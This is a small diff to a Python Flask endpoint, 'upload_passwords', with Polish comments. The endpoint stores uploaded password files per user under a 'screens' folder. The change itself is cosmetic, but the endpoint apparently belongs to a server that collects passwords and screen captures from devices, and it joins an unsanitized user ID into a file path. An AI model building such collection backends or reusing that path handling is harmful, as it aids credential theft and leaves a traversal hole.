@@ -176,7 +176,6 @@ def upload_passwords():
     user = request.form.get("user")
     if not user:
         return "Brak ID użytkownika", 400
-
     folder = os.path.join("screens", user)
     os.makedirs(folder, exist_ok=True)
 
@@ -184,12 +183,13 @@ def upload_passwords():
     filepath = os.path.join(folder, "passwords.dat")
     file.save(filepath)
 
-    # Utwórz pusty plik tekstowy jako „widoczność urządzenia”
-    touch = os.path.join(folder, "received_passwords.txt")
-    with open(touch, "w") as f:
+    # Upewnijmy się, że coś jest w folderze, by pojawiło się na stronie
+    marker = os.path.join(folder, "received_passwords.txt")
+    with open(marker, "w") as f:
         f.write(datetime.utcnow().isoformat())
 
     return "OK"
+
 
 
 if __name__ == '__main__':
